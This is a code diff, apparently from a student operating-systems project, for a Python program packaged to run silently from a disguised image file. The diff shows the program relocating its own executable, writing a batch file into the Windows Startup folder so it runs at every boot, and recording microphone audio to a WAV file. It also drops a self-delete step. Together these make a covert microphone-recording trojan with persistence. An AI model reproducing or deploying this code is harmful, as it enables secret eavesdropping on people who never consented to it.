@@ -15,8 +15,8 @@ import shutil
     #LA COMMANDE EST LA SUIVANTE :
     # pyinstaller --onefile -w C:/..../MicControl.py
     #EXPLICATION DES ARG:
-    # --onefile permet d'avoir tout dans un seule fichier .exe
-    # -w permet de ne peut avoir de console lors de l'exe === ce qui permettera une execusion silencieuse
+    # --onefile permet d'avoir tout dans un seul fichier .exe
+    # -w permet de ne peut avoir de console lors de l'exe === ce qui permettera une execution silencieuse
 
 #***********************************************************************************************************************
 
@@ -25,15 +25,14 @@ import shutil
 #Si il est s'execute a partir de l'image jpg dans ce cas il cree une copie dans un autre path
 #SINON on fait rien
 if os.path.dirname(sys.executable) != 'C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist': #Ces path sont juste pour le test
-    shutil.copy(sys.executable, "C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist/new.exe")
+    shutil.move(sys.executable, "C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist")
     print("loctaion changed")
-
 
 #La fct qui permet de generer le batch file (.bat)
 # qui a son tour va permettre au MicControl.exe de s'executer a chaque demarage de la machine
 def add_to_startup(file_path=""):
     if file_path == "":
-        file_path = os.path.dirname(os.path.realpath(__file__))
+        file_path = os.path.dirname(os.path.realpath("C:/Users/DELL/PycharmProjects/HomeWorkOS/venv/Scripts/dist"))
     bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
     with open(bat_path + '\\' + "Mic.bat", "w+") as bat_file:
         bat_file.write(r'start "" %s' % file_path)
@@ -72,8 +71,4 @@ else: #Si le Mic est en status Unmute en commence l'enregistement directement qu
     sd.wait()
     write('output.wav', fs, record)
 print("End")
-
-#Detruire cet executable du .jpg puisque on a une copie ailleurs
-#C'est la ou j'ai eu le Winerror "ACCESS DENIED"
-os.remove(sys.executable)
 
